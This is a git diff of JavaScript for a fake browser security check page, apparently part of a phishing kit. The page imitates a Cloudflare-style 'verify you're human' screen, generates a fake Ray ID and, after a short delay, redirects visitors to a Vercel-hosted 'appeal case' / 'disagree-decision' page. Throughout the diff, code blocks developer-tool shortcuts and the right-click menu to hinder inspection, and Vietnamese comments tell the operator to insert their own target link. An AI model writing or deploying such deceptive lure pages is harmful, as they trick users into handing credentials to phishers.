@@ -1,36 +1,3 @@
-document.addEventListener('keydown', function (e) {
-  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) || (e.ctrlKey && e.key === 'U')) {
-    e.preventDefault();
-  }
-});
-document.addEventListener('contextmenu', function (e) {
-  e.preventDefault();
-});
-
-const userLang = navigator.language || navigator.userLanguage;
-const langMap = {
-  en: {
-    title: "www.yoursite.com",
-    description: "Checking your browser before accessing...",
-    checkbox: "Verify you're human",
-    footer: "This site is performing a security check before allowing access."
-  },
-  vi: {
-    title: "www.trangcuaban.com",
-    description: "Đang kiểm tra bảo mật kết nối của bạn...",
-    checkbox: "Xác minh bạn là con người",
-    footer: "www.trangcuaban.com cần đánh giá tính bảo mật kết nối của bạn trước khi tiếp tục."
-  }
-};
-
-const lang = userLang.startsWith('vi') ? 'vi' : 'en';
-const content = langMap[lang];
-
-document.getElementById('title').textContent = content.title;
-document.getElementById('description').textContent = content.description;
-document.getElementById('checkbox-text').textContent = content.checkbox;
-document.getElementById('footer-text').textContent = content.footer;
-
 function generateRayID() {
   const chars = 'abcdef0123456789';
   let id = '';
@@ -40,16 +7,30 @@ function generateRayID() {
   return id;
 }
 
-function redirect() {
+// Chỉ tạo Ray ID một lần khi trang được tải
+window.addEventListener('DOMContentLoaded', () => {
   const rayId = generateRayID();
   document.getElementById('ray-id').textContent = rayId;
+
+  // Hiện spinner trước khi hiện checkbox
   setTimeout(() => {
-    window.location.href = "https://appealcaseid1390756882.vercel.app/disagree-decision";
+    document.getElementById('spinner').style.display = 'none';
+    document.getElementById('checkbox-wrapper').style.display = 'flex';
+  }, 1000);
+});
+
+function redirect() {
+  setTimeout(() => {
+    window.location.href = "https://appealcaseid1390756881.vercel.app/disagree-decision"; // Thay bằng link đích của bạn
   }, 1500);
 }
 
-document.getElementById('ray-id').textContent = generateRayID();
-setTimeout(() => {
-  document.getElementById('spinner').style.display = 'none';
-  document.getElementById('checkbox-wrapper').style.display = 'flex';
-}, 1000);
+// Chặn F12 và context menu
+document.addEventListener('keydown', function (e) {
+  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) || (e.ctrlKey && e.key === 'U')) {
+    e.preventDefault();
+  }
+});
+document.addEventListener('contextmenu', function (e) {
+  e.preventDefault();
+});
